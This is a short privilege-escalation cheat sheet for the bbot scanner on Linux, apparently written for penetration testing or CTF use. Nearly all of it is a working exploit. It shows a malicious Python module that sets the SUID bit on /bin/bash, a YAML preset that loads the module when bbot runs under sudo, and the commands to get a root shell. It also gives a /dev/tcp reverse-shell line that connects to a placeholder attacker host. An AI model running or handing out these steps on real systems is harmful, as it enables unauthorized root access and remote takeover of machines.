# bbot Preset Module Sudo Privesc

When `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/bbot` or `(ALL) NOPASSWD: /usr/bin/bbot -p *`, bbot will load Python modules from any directory specified in a YAML preset — run arbitrary code as root.

```python
# /dev/shm/ExploitModule.py
from bbot.modules.base import BaseModule
import os

class ExploitModule(BaseModule):
    async def setup(self):
        os.system("chmod u+s /bin/bash")
        return True
```

```yaml
# /dev/shm/preset.yml
modules:
  - ExploitModule
module_dirs:
  - /dev/shm/
```

```bash
sudo bbot -p /dev/shm/preset.yml
# Then: /bin/bash -p  →  root shell
```

For a direct reverse shell replace `os.system(...)` with:
```python
os.system("bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1")
```
